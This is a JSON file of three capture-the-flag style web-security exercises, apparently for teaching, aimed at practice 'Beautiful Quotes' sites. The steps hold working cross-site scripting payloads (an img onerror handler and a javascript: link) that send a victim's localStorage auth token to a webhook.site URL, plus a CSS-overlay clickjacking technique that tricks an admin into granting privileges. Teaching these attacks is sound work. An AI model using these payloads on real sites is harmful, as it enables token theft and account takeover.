{"Exercise 2": {"websiteUrl": "https://beautiful-quotes-2.rexvalkering.nl", "instructions": [{"text": "Does the previous hack still work? If you add the following code to the 'quote' field, do you see bolded text?", "code": ""}, {"text": "A new input field called \"Source\" has appeared. This is where you can add a URL to make the author a clickable link. Add a quote with a valid URL in the source and confirm that the link is now clickable.", "code": "Example URL: https://google.com/"}, {"text": "A URL should always start with http:// or https://. What happens if you add something else, for example 'test'. Is the link still clickable?", "code": ""}, {"text": "Programmers often forget that links don't have to be links: they can also execute javascript! Add the code below in the Source field. What happens after you click the link?", "code": "javascript: alert(1);"}, {"text": "What you just did is also called Cross Site Scripting, only it has the downside that you must trick the user into clicking the link. Fortunately, the admin always clicks the link when visiting this website. The next steps are the same as the steps from the previous exercise. Do you know what to do?", "code": ""}, {"text": "Copy and paste the code below in the Source field. Don't forget to replace YOURURLHERE with your webhook.site link, like you did in exercise 1.", "code": "javascript: var i = new Image(); i.src='YOURURLHERE?token=' + localStorage.getItem('auth-token');"}, {"text": "Go to your webhook.site URL. You should see two requests pop up on the left side, with different API tokens. One is your token, another is the admins. Copy the API token of the administrator.", "code": ""}, {"text": "Go back to Local Storage (see step 3) and replace the API token with the token you just stole. Refresh the website and click on “Reveal the flag”. Congratulations!", "code": ""}], "hints": [{"text": "Add a quote with a URL in the source. What happens to the URL?", "code": ""}, {"text": "Add a quote where the URL is not a URL, but triggers an alert box instead.", "code": ""}, {"text": "Remember the previous exercise? You know what to do next!", "code": ""}], "description": "After your vicious hack of the previous website, the admin has returned with a superior successor: Beautiful Quotes 2! Unfortunately, the v-html vulnerability has been patched; however, the administrator has added some other functionality which can be abused. Can you execute another cross-site scripting attack to steal the admin's token and reveal the flag?", "title": "Exercise Two: Cross-Site Scripting with v-href."}, "Exercise 1": {"websiteUrl": "https://beautiful-quotes.rexvalkering.nl", "instructions": [{"text": "In the quote field, enter the code below and submit it. Confirm that the quote submitted is in bold.", "code": "<strong>This is a quote</strong>"}, {"text": "In the quote field, enter the code below and submit it. This code inserts an image object without an actual image, and defines an 'error handler' for when it cannot be loaded. Do you see that you are able to execute some javascript in someone elses browser?", "code": "<img src=\"\" onerror=\"alert('Hello World!')\" />"}, {"text": "Being able to run javascript in someone elses browser is a huge security issue. The next step is to use this to steal secret tokens. This application stores an API token in the Local Storage. Go to the website's Local Storage and look for the API token. What is the name?", "code": "In Chrome: F12 → Application → Local Storage. In Firefox: F12 → Storage → Local Storage."}, {"text": "We’re going to trick the admin into sending us his API token. For this we first need to create a page where our code can send the API token to. Go to webhook.site and copy the URL under “Your randomly generated URL”. Don’t close this site yet!", "code": ""}, {"text": "It’s time to hack the admin! Copy the code below and replace YOURURLHERE with the url you just copied. Enter it in the quote field and submit the quote.", "code": "<img src=\"\" onerror=\"var i = new Image(); i.src='YOURURLHERE?token=' + localStorage.getItem('auth-token');\" />"}, {"text": "Go to your webhook.site URL. You should see two requests pop up on the left side, with different API tokens. One is your token, another is the admins. Copy the API token of the administrator.", "code": ""}, {"text": "Go back to Local Storage (see step 3) and replace the API token with the token you just stole. Refresh the website and click on “Reveal the flag”. Congratulations!", "code": ""}], "hints": [{"text": "Try to add a quote with bolded text.", "code": ""}, {"text": "Try to add a quote that triggers an alert box!", "code": ""}, {"text": "Look in the local storage of your browser. What is the key / name of the authentication token?", "code": ""}, {"text": "Replace the alert from step 2 with a console.log that logs the value of the token to the console.", "code": ""}, {"text": "Replace the code of step 4 with some code that sends the authentication token to your webhook.site link.", "code": ""}, {"text": "Replace the authentication token in your localStorage with the token retrieved from your webhook, then reveal the flag!", "code": ""}], "description": "A new website has launched: Beautiful Quotes! This website allows you to share your quotes with the world, using the styling of your choice. Unfortunately, the website is vulnerable to a cross-site scripting attack. Can you steal the admin token and reveal the flag?", "title": "Exercise One: Cross-Site Scripting with v-HTML."}, "Exercise": {"description": "", "title": "", "websiteUrl": "", "Key": "English", "hints": [], "instructions": []}, "Exercise 3": {"websiteUrl": "https://beautiful-quotes-3.rexvalkering.nl", "instructions": [{"text": "This is a hard exercise that showcases how a hacker pieces together different pieces of information, and how they can work around limitations of the webpage. It can become a bit technical, so don't forget to ask for help if you need it.", "code": ""}, {"text": "Last time, we added some javascript to the URL. Try to add the code below to the author source; what happens now? Is the link still clickable?", "code": "javascript: alert(1);"}, {"text": "It seems the admin has removed all Cross Site Scripting vulnerabilities. Perhaps we can find something else we can exploit. Try adding a quote with a valid URL, and with bold 'Author styling'. Confirm that the link is now clickable, and that the link is using bold text.", "code": ""}, {"text": "Now it's getting a bit more technical. Right-click the Author Styling dropdown field, and select 'Inspect' (Chrome) or 'Inspect Element' (Firefox). The new screen shows the code of the webpage you are looking at. The piece of code you selected probably looks like the code below. What you see here is an 'option' element with a value.", "code": "<option value=\"font-weight: bold\">Bold</option>"}, {"text": "Look at the value for 'bold'. The value looks like CSS code. Maybe we can abuse that?", "code": ""}, {"text": "Double-click on 'font-weight: bold' in the code inspection screen. You should now be able to edit it. Change it to the code below. Now, click the dropdown again, select 'Bold', then add a valid URL and a quote and submit the form. If you're doing it right, the author text should be really big!", "code": "font-size: 50px"}, {"text": "We can change the style of author as we like, but right now this is useless. We need to look some more at this website to continue. What other elements are new?", "code": ""}, {"text": "To the right of each quote is a 'Make admin' button. If you click it, nothing happens. This is because the button is disabled.", "code": ""}, {"text": "Try right-clicking the button and selecting 'Inspect element' again. it should look something like the code below. There is a property on it, disabled=\"disabled\". This disables the button. Try double-clicking it and hitting backspace a couple of times to remove it. Is the button now clickable? Does something happen when you click the button?", "code": "<button data-v-97e12a22=\"\" class=\"btn btn-primary admin-button\" disabled=\"disabled\">Make admin</button>"}, {"text": "Even though you've enabled the button, nothing happens when you click it. Is there perhaps another screen for programmers that can give us more information?", "code": ""}, {"text": "In the programmer screen, you should see multiple tabs, such as 'Elements', 'Console', 'Sources' and 'Network'. Click the Console tab. Though the text may look cryptic, it does give you some valuable information.", "code": ""}, {"text": "The console tab shows something similar to the text below. This means that, on clicking the link, you are going to another page, which looks like https://beautiful-quotes-3.rexvalkering.nl/make-admin/12345678. We do not have permissions to click the link though. Hmm, perhaps we can abuse this?", "code": "Caught navigation to https://beautiful-quotes-3.rexvalkering.nl/make-admin/12345678; doing a makeAdmin dispatch instead."}, {"text": "Copy the link from the 'Console' tab and paste it into the Source input, then submit a quote. Is it a valid URL?", "code": ""}, {"text": "We now have a valid URL and we have control of the styling. Our goal is to trick the admin into clicking the link. Look at the text at the top of the page, which tells us what the admin does.", "code": ""}, {"text": "First, edit the 'value' of Bold to the code below. Second, add the URL from the previous step in the Source field. Add a quote and submit the URL. This creates a URL that is styled over the 'Logout' link, which the admin clicks when they try to log out. You've just tricked them into making you an administrator!", "code": "position:fixed;top:500px;left:50px;height:200px;width: 300px;z-index: 1;"}, {"text": "Refresh the page and claim your final flag.", "code": ""}], "hints": [{"text": "Add a quote with a style. Where is the style applied?", "code": ""}, {"text": "Add a quote with a bigger font size style applied.", "code": ""}, {"text": "It looks like the admin is not clicking on our links anymore. If they were, what link would you want them to click?", "code": ""}, {"text": "Can you trick the admin into clicking your link, using styling?", "code": ""}], "description": "The administrator has barely recovered from your latest hack and you are already gearing up for your next one. With the help of a security expert, the admin has removed all XSS vulnerabilities, but thanks to new additions the site is still not fully secure. Can you pull one last heist?", "title": "Exercise Three: Clickjacking with v-style and v-href."}}